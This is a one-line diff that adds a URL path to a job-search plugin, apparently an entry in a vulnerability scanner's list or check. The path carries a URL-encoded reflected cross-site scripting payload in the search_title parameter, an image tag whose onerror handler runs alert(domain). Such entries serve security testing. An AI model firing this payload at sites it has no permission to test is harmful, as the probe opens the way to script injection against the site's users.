@@ -1,0 +1,1 @@
+/plugins/jobsearch/?search_title=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28domain%29%3E&ajax_filter=true&posted=all&sort-by=recent
